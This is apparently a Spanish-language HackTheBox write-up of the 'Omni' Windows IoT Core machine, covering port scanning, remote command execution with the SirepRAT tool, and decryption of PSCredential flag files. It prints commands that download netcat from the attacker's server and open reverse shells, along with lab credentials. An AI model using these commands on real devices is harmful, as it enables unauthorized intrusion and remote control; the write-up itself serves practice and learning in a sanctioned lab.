---
layout      : post
title       : "HackTheBox - Omni"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png
category    : [ htb ]
tags        : [ IoT, powershell ]
---
Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags.

![omniHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/omniHTB.png)

## TL;DR (Spanish writeup)

Holas, bienvenid@ a rompernos la cabeza:

En esta máquina nos encontraremos con un dispositivo `IoT Windows`, el cual tiene como sistema base `IoT Core`, que buscando en internet nos encontramos un exploit que nos permitirá ejecutar comandos remotamente, lo usaremos para obtener una reverse Shell. Estando dentro podremos ver las flags de `user.txt` y `root.txt`... Listos, hemos terminado :P

Ehhh no, no hemos terminado, las flags están encriptadas, nos romperemos un poco la cabeza buscando y leyendo para al final encontrar un archivo con credenciales que nos abrirá dos puertas en un portal o.O: `Windows Device Portal`, el cual nos permite gestionar nuestro dispositivo. Nos aprovecharemos de un apartado que ejecuta comandos para entablar una nueva reverse Shell, en primera medida como el usuario `administrator` para mediante una función de `PowerShell` ver el contenido de la flag `root.txt`. Haremos el mismo procedimiento pero con el usuario `app` para ver el contenido de la flag `user.txt`. Sin más, démosle candela (:

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además me enfoco en plasmar mis errores y exitos (por si ves mucho texto).

...

### Fases

Tendremos 3 fases. Enumeración, explotación y escalada de privilegios :)

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos realizando un escaneo de puertos sobre la máquina para así saber que servicios está corriendo.

```bash
–» nmap -p- --open -v -Pn 10.10.10.204
```

Pero va algo lento, agregando `-T` va igual, podemos agregar `--min-rate` y ver si va más rápido. (Sin embargo es importante hacer un escaneo total, sin cambios, así vaya lento, que nos permita ver si obviamos/pasamos algún puerto.

```bash
–» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.204 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T         | Forma de escanear superrápido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos                                      |
| -Pn        | Evita que realice Host Discovery, como **ping** (P) y el **DNS** (n)                                     |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Wed Oct 28 10:58:58 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.204
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.204 ()   Status: Up
Host: 10.10.10.204 ()   Ports: 135/open/tcp//msrpc///, 5985/open/tcp//wsman///, 8080/open/tcp//http-proxy///, 29817/open/tcp/////, 29819/open/tcp/////  Ignored State: filtered (65530)

```

Obtenemos la siguiente información:

* **Puerto 135**: [Microsoft Remote Procedure Call](https://en.wikipedia.org/wiki/Microsoft_RPC)
* **Puerto 5985**: [WSMan](https://en.wikipedia.org/wiki/WS-Management)
* **Puerto 8080**: Proxy web
* **Puerto 29817**: Desconocido

Procedemos a nuestro escaneo de versiones y scripts para obtener información más detallada de cada servicio:

```bash
–» nmap -p135,5985,8080,29817,29819 -sC -sV -Pn 10.10.10.204 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Wed Oct 28 11:16:31 2020 as: nmap -p135,5985,8080,29817,29819 -sC -sV -Pn -oN portScan 10.10.10.204
Nmap scan report for 10.10.10.204
Host is up (0.19s latency).

PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

```

Ok, tenemos cositas varias:

* **[UPNP](https://es.wikipedia.org/wiki/Universal_Plug_and_Play)**: Universal Plug and Play (conjunto de protocolos de comunicación que permite a periféricos en la red, encontrar otros dispositivos, establecer conexiones y compartir datos).
* **[Windows Device Portal](https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal)**: Plataforma que permite configurar y mantener un dispositivo remotamente sobre una red local :)
* **[arcserve](https://www.arcserve.com/es/)**: Proveedor en la protección de datos, replicación y recuperación de los mismos.
* Tenemos sistema operativo Windows, así que el dispositivo IoT esta sobre él.

...

Bueno pues veamos el servidor web.

## Puerto 8080

![page8080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/page8080.png)

Si buscamos en internet nos indica que las credenciales por default para ingresar a **Windows Device Portal** son:

* **username**: Administrator
* **password**: p@ssw0rd

Pero no nos funcionan... Buscando exploits encontramos un proyecto interesante.

...

## Explotación [#](#explotacion) {#explotacion}

* [Herramienta SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)
* [Articulo en español abordandola](https://www.hackplayers.com/2019/03/exploit-para-ownear-Windows-IoT-Core.html)

> Exploit que aprovecha una vulnerabilidad del protocolo de comunicaciones `Sirep/WPCon/TShell` y que puede permitir a un atacante ejecutar comandos en el sistema. [(HackPlayers)](https://es.wikipedia.org/wiki/Protocolo_de_aplicaciones_inal%C3%A1mbricas)

* [WPcon (Protocolo de aplicaciones inalámbricas)](https://es.wikipedia.org/wiki/Protocolo_de_aplicaciones_inal%C3%A1mbricas)

> We broke down the Sirep/WPCon protocol and demonstrated how this protocol exposes a remote command interface for attackers, that include RAT abilities such as get/put arbitrary files on arbitrary locations and obtain system information. [(SirepRAT)](https://github.com/SafeBreach-Labs/SirepRAT)

Podemos iniciar probando que usuario somos y validar su output:

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

Perfecto, tenemos ejecución de comandos. En la fila `<OutputStreamResult>` vemos nuestra respuesta: `'C:\Data\Users\DefaultAccount'`.

El programa tiene la opción de ejecutar los comandos como SYSTEM (simplemente quitamos `--as_logged_on_user`).

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 22, payload peek: 'C:\Data\Users\System'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

¿En qué directorio estamos parados?

```powershell
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo %cd%" --v
---------
C:\windows\system32

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 21, payload peek: 'C:\windows\system32'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

* Con `--v` hacemos el típico **verbose**, nos sirve si queremos hacer `dir` para ver todo el output:

```powershell
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir ..\..\"" --v
---------
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\

07/20/2020  02:36 AM    <DIR>          $Reconfig$
10/26/2018  11:35 PM    <JUNCTION>     Data [\??\Volume{ac55f613-7018-45c7-b1e9-7ddda60262fd}\]
10/26/2018  11:37 PM    <DIR>          Program Files
10/26/2018  11:38 PM    <DIR>          PROGRAMS
10/26/2018  11:37 PM    <DIR>          SystemData
10/26/2018  11:37 PM    <DIR>          Users
07/03/2020  10:35 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)     584,499,200 bytes free

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 584, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

Vemos la estructura raíz del sistema... Perfecto, intentemos subir el binario **netcat** para entablarnos una reverse Shell y estar más cómodos:

Recientemente vimos una ruta hacia `C:\Data\Users\DefaultAccount`, podemos usarla para subir el binario. Primero montamos un servidor web con Python donde este `nc.exe`:

```bash
–» python3 -m http.server
```

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc.exe -OutFile C:\Data\Users\DefaultAccount\nc.exe"
```

Validamos:

```powershell
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir C:\Data\Users\DefaultAccount" --v
---------
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Users\DefaultAccount

10/29/2020  09:25 PM    <DIR>          .
10/29/2020  09:25 PM    <DIR>          ..
07/03/2020  11:22 PM    <DIR>          3D Objects
07/03/2020  11:22 PM    <DIR>          Documents
07/03/2020  11:22 PM    <DIR>          Downloads
07/03/2020  11:22 PM    <DIR>          Favorites
07/03/2020  11:22 PM    <DIR>          Music
10/29/2020  10:21 PM            45,272 nc.exe
07/03/2020  11:22 PM    <DIR>          Pictures
07/03/2020  11:22 PM    <DIR>          Videos
               1 File(s)         45,272 bytes
               9 Dir(s)   4,692,344,832 bytes free

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 688, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```

Nos ponemos en escucha (`nc -nvlp 4433`) y ejecutamos:

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc.exe 10.10.15.30 4433 -e cmd.exe" --v
```

Acá tenemos problemas con la versión de `nc.exe`, así que descargaremos las 2 y probaremos con las 2... Volvemos a subir la de 32 Bits, pero no funciona, probemos con la de 64 :)

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc64.exe -OutFile C:\Data\Users\DefaultAccount\nc64.exe"
```

Validemos de una:

```bash
–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc64.exe 10.10.15.30 4433 -e cmd.exe" --v
```

![bashrevshell1OK](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/bashrevshell1OK.png)

Perfecto, tamos dentro :) veamos que más nos encontramos.

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Encontramos varios archivos, podemos ver `root.txt` y `user.txt`, pero están encriptados mediante la clase `System.Management.Automation.PSCredential`. 

![rvs1flagsencrypted](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs1flagsencrypted.png)

#### user.txt

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>
```

Buscando y leyendo durante bastante tiempo, intentando solucionar problemas, desencriptar y quebrándome la cabeza... Nelson, no pudimos así que me sentí superperdido sin saber que hacer y me fui para el foro.

Curiosamente muchas personas también se habían estancado ahí, los demás indicaban que era necesario encontrar otro archivo en el que van a haber cosas bonitas... Leyendo como podemos apoyarnos de `PowerShell` para buscar objetos rápidamente encontré esta manera:

* [Buscar de manera recursiva PowerShell](https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell).
* [... y exclusiva](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/).

```powershell
# Guardamos el año en una variable
$date = Get-Date -Year 2019
# Le indicamos que busque en la ruta actual (**.**), donde nos muestre los archivos ocultos (**-force**), entre y busque en cada carpeta (**-recurse**) y tenga una fecha mayor o igual a la variable que guardamos
Get-ChildItem -Path . -force | Where-Object { $_.LastWriteTime -ge $date }
```

Con esto estuve rondando algunas carpetas, hasta que busque en la misma relacionada con `PowerShell`, situada en: `C:\Program Files\WindowsPowerShell`.

![rvs1rbatfound](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs1rbatfound.png)

Encontramos este archivo llamado `r.bat`, que quieras o no parece sospechoso, por la fecha y por su nombre, veamos si encontramos algo ahí.

```powershell
PS C:\Program Files> type "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat"
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
PS C:\Program Files>
```

Vemos los dos usuarios a los que les encontramos sus respectivas flags: **administrator** y **app**. Con lo que parecen ser contraseñas, podemos probar mediante el portal que nos encontramos en el puerto 8080 y con WinRM.

* app : mesh5143
* administrator : _1nt3rn37ofTh1nGz

Mediante `WinRM` no podemos acceder, probando con el portal y con las credenciales de administrador, logramos entrar:

![pageportalinsideadmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/pageportalinsideadmin.png)

Dandole una pasada vemos un apartado donde podemos ingresar comandos en el sistema. Al estar como administrador, podemos ejecutar las instrucciones como él. 

![pageportalcommand](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/pageportalcommand.png)

**Veamos la diferencia entre SYSTEM y ADMINISTRATOR:**

```powershell
# Sesión que tenemos actualmente.
C:\Data\Users\app>echo %userprofile%
C:\Data\Users\System

# Arbol de archivos en el que tenemos `hardening.txt`, al cual no podemos acceder.
C:\Data\Users\app>dir
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Users\app

07/04/2020  08:53 PM    <DIR>          .
07/04/2020  08:53 PM    <DIR>          ..
07/04/2020  06:28 PM    <DIR>          3D Objects
07/04/2020  06:28 PM    <DIR>          Documents
07/04/2020  06:28 PM    <DIR>          Downloads
07/04/2020  06:28 PM    <DIR>          Favorites
07/04/2020  07:20 PM               344 hardening.txt
07/04/2020  07:14 PM             1,858 iot-admin.xml
07/04/2020  06:28 PM    <DIR>          Music
07/04/2020  06:28 PM    <DIR>          Pictures
07/04/2020  08:53 PM             1,958 user.txt
07/04/2020  06:28 PM    <DIR>          Videos
               3 File(s)          4,160 bytes
               9 Dir(s)   4,690,558,976 bytes free

C:\Data\Users\app>type hardening.txt
type hardening.txt
Access is denied.
```

Ahora juguemos con el portal:

```powershell
Command> echo %userprofile%
C:\Data\Users\administrator 
```

Perfecto, pues intentemos obtener una reverse Shell mediante el portal:

![rvs2portalhardone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs2portalhardone.png)

Listos, tamos como **administrator**, veamos si ahora si podemos jugar con las flags :P

De las búsquedas y lecturas que ya había hecho, encontré este comando que toma la estructura del archivo y la convierte en un objeto del sistema, del cual podemos ver el usuario y contraseña que tenga asignada:

```powershell
$credential = Import-CliXml -Path  <PathToXml>\MyCredential.xml
```

* [Save and read sensitive data with PowerShell](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)

Entonces podemos usar esto para validar:

* user.txt
* root.txt
* iot-admin.xml

También de la lectura previa entendí que si no somos el propietario del archivo, lo más probable es que obtengamos algún tipo de error, en nuestro caso al intentar jugar con `user.txt` y `iot-admin.xml`, obtenemos:

```powershell
PS c:\Data\Users\app> $credential = Import-CliXml -Path c:..user.txt
Import-CliXml : Error occurred during a cryptographic operation.
At line:1 char:15
+ $credential = Import-CliXml -Path c:..user.txt
+               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic 
   Exception
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
```

El tema es que el algoritmo está apoyado en una [llave](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT) única de cada usuario y pues al ser nosotros **administrator**, no tenemos la llave de **app**, que sería el usuario que puede manejar `user.txt`, puedes [encontrar más info acá](https://www.travisgan.com/2015/06/powershell-password-encryption.html) y [acá](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/).

Entonces probemos con `root.txt`:

![rvs2flagroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs2flagroot.png)

Perfecccccccto, tenemos el hash MD5 que piden en HTB, solo nos queda pasarnos al usuario **app** y ver la flag `user.txt`. (Tengo la impresión que hice el proceso al revés, con lo que sigue lo confirmo o me retracto :P)

Hacemos el mismo procedimiento que con el usuario **administrator**. Entramos al portal y mediante la ejecución de comandos le decimos que nos haga una reverse Shell como **app**...

> Realmente no creo que sean necesarias las reverse shell, ya que podemos ejecutar la linea desde el mismo portal, pero yo que se, me gusta :)

```powershell
Command> echo %userprofile%
Command> c:\Data\Users\DefaultAccount\nc64.exe 10.10.14.188 4435 -e cmd.exe
Access is denied.
```

Muy bien, entonces movamos el binario a una carpeta de la que sea propietario el usuario **app**. Lo hice con la sesión que tenía abierta de **SYSTEM**, cerré la de **administrator** :(

Lo movemos a `c:\Data\Users\app\Videos` y despues en el portal:

```powershell
c:\Data\Users\app\Videos\nc64.exe 10.10.14.188 4435 -e cmd.exe
```

Veamos la flag de `user.txt`:

![rvs3flaguser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs3flaguser.png)

Bien, ahora quiero probar si hice todo al revés o si daba igual <>_<>

```powershell
PS C:\Data\Users\app> $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
PS C:\Data\Users\app> $credential.GetNetworkCredential().Username
administrator
PS C:\Data\Users\app> $credential.GetNetworkCredential().Password
_1nt3rn37ofTh1nGz
PS C:\Data\Users\app> 
```

Entiendo que daba igual, ya que con esta contraseña entrabamos al portal, pero como el usuario administrador... Algo raro es que en el archivo `r.bat` no sé por qué no estaban solo las credenciales del usuario **app**, para que `iot-admin.xml` tomara valor... Muy extraño.

...

Pero listos, hemos terminado con esta máquina, la verdad, sencilla. Un poco desesperante el encontrar el archivo `r.bat`, pero bueno, de eso se trata la enumeración. Hicimos el camino al revés, pero llegamos al mismo sitio, así que todo perfecto. Muchas gracias por leer y a seguir rompiendo todo (: